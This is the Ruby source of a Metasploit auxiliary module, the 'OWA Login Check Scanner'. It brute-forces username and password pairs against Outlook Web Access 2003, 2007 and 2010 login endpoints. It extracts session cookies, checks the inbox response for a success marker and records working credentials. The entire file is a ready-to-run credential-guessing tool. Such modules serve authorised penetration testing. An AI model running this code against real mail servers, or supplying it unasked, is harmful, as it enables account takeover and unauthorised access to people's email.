require 'cgi'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'		=> 'OWA Login Check Scanner',
			'Description'	=> %q{
				This module tests credentials on OWA 2003, 2007 and 2010 servers.
			},
			'Author'	=> 
				[
					'Spencer McIntyre',
					'SecureState R&D Team'
				],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 20 $'
		)

		register_options(
			[
				OptInt.new('RPORT', [ true, "The target port", 443]),
				OptString.new('VERSION', [ true, "OWA VERSION (2003, 2007, or 2010)", '2007'])
			], self.class)
		deregister_options('BLANK_PASSWORDS')
		register_advanced_options(
			[
				OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])	# default to true
			], self.class)
	end
	
	def run
		datastore['BLANK_PASSWORDS'] = false	# OWA doesn't support blank passwords
		vhost = datastore['VHOST'] || datastore['RHOST']
		if datastore['VERSION'] == '2003'
			authPath = '/exchweb/bin/auth/owaauth.dll'
			inboxPath = '/exchange/'
			loginCheck = /Inbox/
		elsif datastore['VERSION'] == '2007'
			authPath = '/owa/auth/owaauth.dll'
			inboxPath = '/owa/'
			loginCheck = /addrbook.gif/
		elsif datastore['VERSION'] == '2010'
			authPath = '/owa/auth.owa'	# Post creds here
			inboxPath = '/owa/'			# Get request with cookie/sessionid
			loginCheck = /Inbox/		# check result
		else
			print_error('Invalid Version, Select 2003, 2007, or 2010')
			return
		end
		print_status("Starting OWA login attempts")
		begin
			each_user_pass do |user, pass|
				try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
			end
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
			print_error('HTTP Connection Error, Aborting')
		end
	end

	def try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
		headers = {
			'User-Agent' => 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.11) Gecko/20100723 Fedora/3.5.11-1.fc12 Firefox/3.5.11',		# this is apparently critical
			'Cookie' => 'PBack=0'
		}
		
		if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
			data = 'destination=https%3A%2F%2F' << CGI::escape(vhost) << '&flags=0&trusted=0&username=' << CGI::escape(user) << '&password=' << CGI::escape(pass)
		else
			data = 'destination=http%3A%2F%2F' << CGI::escape(vhost) << '&flags=0&trusted=0&username=' << CGI::escape(user) << '&password=' << CGI::escape(pass)
		end
		
		begin
			res = send_request_cgi({
				'uri'		=> authPath,
				'method'	=> 'POST',
				'headers'	=> headers,
				'data'		=> data
			}, 20)
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error('HTTP Connection Failed, Aborting')
			return :abort
		end
		if not res
			print_error('HTTP Connection Error, Aborting')
			return :abort
		end
		if not res.headers['set-cookie']
			print_error('Received Invalid Repsonse (Possibly Due To Invalid Version), Aborting')
			return :abort
		end
		
		sessionid = 'sessionid=' << res.headers['set-cookie'].split('sessionid=')[1].split('; ')[0]								# these two lines are the authentication info
		cadata = 'cadata=' << res.headers['set-cookie'].split('cadata=')[1].split('; ')[0]
		
		headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata
		
		begin
			res = send_request_cgi({
				'uri'		=> inboxPath,
				'method'	=> 'GET',
				'headers'	=> headers
			}, 20)
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error('HTTP Connection Failed, Aborting')
			return :abort
		end
		
		if not res
			print_error('HTTP Connection Error, Aborting')
			return :abort
		end
		
		if res.code == 302
			vprint_status("FAILED LOGIN #{user} : #{pass}")
			return :skip_pass
		end

		if res.body =~ loginCheck
			print_good("SUCCESSFUL LOGIN '#{user}' : '#{pass}'")
			
			report_hash = {
				:host	=> datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname	=> 'owa',
				:user	=> user,
				:pass   => pass,
				:active => true,
				:type => 'password'
			}
			report_auth_info(report_hash)
			return :next_user
		else
			vprint_status("FAILED LOGIN #{user} : #{pass}")
			return :skip_pass
		end
	end
	
end
